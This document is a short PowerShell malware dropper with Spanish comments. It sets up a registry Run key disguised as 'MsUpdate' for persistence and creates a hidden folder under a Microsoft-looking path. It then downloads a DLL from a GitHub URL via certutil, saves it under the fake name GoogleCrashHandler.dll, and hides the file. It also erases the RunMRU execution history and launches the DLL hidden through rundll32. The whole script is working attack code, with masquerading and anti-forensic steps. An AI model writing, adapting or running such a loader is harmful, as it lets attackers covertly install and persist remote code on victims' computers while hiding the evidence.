
# Registry path for the startup entries
$rutaRegistro = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$nombreEntrada = "MsUpdate"
if (-not (Test-Path "$rutaRegistro\$nombreEntrada")) {
    $valorEntrada = "rundll32.exe $env:UserProfile\AppData\Local\Microsoft\MsUpdate\GoogleCrashHandler.dll,UpdDll32"
    $null = New-ItemProperty -Path $rutaRegistro -Name $nombreEntrada -Value $valorEntrada -PropertyType String -Force
}

## Create directory
$UserProfile = [System.Environment]::GetFolderPath("UserProfile")
$MsRdpNetPath = Join-Path $UserProfile "AppData\Local\Microsoft\MsUpdate"
if (-not (Test-Path -Path $MsRdpNetPath)) {
    $MsRdpNetFolder = New-Item -Path $MsRdpNetPath -ItemType Directory -Force 
    $MsRdpNetFolder.Attributes += "Hidden"
}

# Copy Agent
$rutaArchivo = Join-Path $env:UserProfile\AppData\Local\Microsoft\MsUpdate\ "GoogleCrashHandler.dll"
if (-not (Test-Path -Path $rutaArchivo)) {
    $urlDescarga = "https://github.com/andradecristian/varios/raw/main/DLLAES.dll"
    $salidaDescarga = Join-Path $env:UserProfile\AppData\Local\Microsoft\MsUpdate\ "GoogleCrashHandler.dll"
    certutil -urlcache -split -f $urlDescarga $salidaDescarga | Out-Null
    $archivoDescargado = Get-Item $salidaDescarga
    [System.IO.File]::SetAttributes($archivoDescargado.FullName, [System.IO.FileAttributes]::Hidden)
}

### Prcesos en memoria para evair
#$url = "https://www.youtube.com/watch?v=P5mtclwloEQ"
#Start-Process $url

# Limpiar historial de ejecucion
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
Remove-Item -LiteralPath $registryPath -Force

## Execution of the client
Start-Process -FilePath "rundll32.exe" -ArgumentList "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\GoogleCrashHandler.dll,UpdDll32" -WindowStyle Hidden

##Lock Windows
#Start-Process rundll32.exe -ArgumentList 'user32.dll,LockWorkStation' -NoNewWindow -Wait

